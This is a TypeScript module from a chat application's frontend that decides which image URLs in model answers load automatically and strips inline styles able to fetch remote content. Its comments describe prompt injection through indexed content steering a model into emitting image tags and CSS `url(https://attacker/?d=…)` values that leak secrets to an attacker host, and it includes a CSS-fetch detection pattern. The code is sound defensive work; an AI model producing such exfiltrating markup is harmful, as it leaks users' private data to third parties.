import type { Root as HastRoot, RootContent as HastNode } from 'hast';
import { defaultUrlTransform, type UrlTransform } from 'react-markdown';
import { getApiBaseUrl } from '@/lib/utils/api-base-url';

/**
 * Which image URLs in rendered model output may load without a click.
 *
 * Model output is attacker-steerable (prompt injection through indexed
 * content), and an auto-loading `<img src="https://attacker/?d=<secret>">`
 * leaks data the moment an answer renders. Only URLs that cannot reach a third
 * party load automatically: `data:image/…`, `blob:`, and URLs on the app's
 * own origin or the PipesHub API origin (record, storage and artifact
 * endpoints all live there). Everything else, including presigned S3/Azure
 * URLs whose host the browser cannot verify, waits for a click.
 */

export type ImageUrlDecision =
  | { kind: 'auto'; src: string }
  | { kind: 'click'; src: string; host: string }
  | { kind: 'blocked' };

const DATA_IMAGE_PREFIX = /^data:image\//i;
const BLOB_PREFIX = /^blob:/i;

function trustedOrigins(): Set<string> {
  const origins = new Set<string>();
  if (typeof window === 'undefined') return origins;
  origins.add(window.location.origin);
  const apiBase = getApiBaseUrl();
  if (apiBase) {
    try {
      origins.add(new URL(apiBase, window.location.origin).origin);
    } catch {
      // A malformed API base simply adds nothing.
    }
  }
  return origins;
}

export function classifyImageUrl(src: string | null | undefined): ImageUrlDecision {
  const value = (src ?? '').trim();
  if (!value) return { kind: 'blocked' };
  if (DATA_IMAGE_PREFIX.test(value) || BLOB_PREFIX.test(value)) {
    return { kind: 'auto', src: value };
  }
  if (typeof window === 'undefined') return { kind: 'blocked' };

  let url: URL;
  try {
    url = new URL(value, window.location.href);
  } catch {
    return { kind: 'blocked' };
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') {
    return { kind: 'blocked' };
  }
  if (trustedOrigins().has(url.origin)) {
    return { kind: 'auto', src: value };
  }
  return { kind: 'click', src: url.href, host: url.host };
}

/**
 * react-markdown's default transform empties every `data:`/`blob:` URL. Keep
 * the default for everything else and let those two schemes through for
 * `<img src>` only, so `classifyImageUrl` sees them.
 */
export const markdownUrlTransform: UrlTransform = (url, key, node) => {
  if (key === 'src' && node.tagName === 'img' && (DATA_IMAGE_PREFIX.test(url) || BLOB_PREFIX.test(url))) {
    return url;
  }
  return defaultUrlTransform(url);
};

// A backslash counts too: CSS escapes (`\75 rl(`) would otherwise hide `url(`.
const CSS_FETCH_PATTERN = /url\s*\(|image-set\s*\(|@import|\\/i;

/**
 * Inline `style` is allowed on some raw-HTML elements in answers, and
 * `background: url(https://attacker/?d=…)` fetches just like an `<img>`.
 * Drop any style attribute that could make the browser fetch something.
 */
export function rehypeStripStyleUrls() {
  const walk = (node: HastRoot | HastNode): void => {
    if (node.type === 'element') {
      const style = node.properties?.style;
      if (typeof style === 'string' && CSS_FETCH_PATTERN.test(style)) {
        delete node.properties.style;
      }
    }
    if ('children' in node) node.children.forEach(walk);
  };
  return (tree: HastRoot) => walk(tree);
}
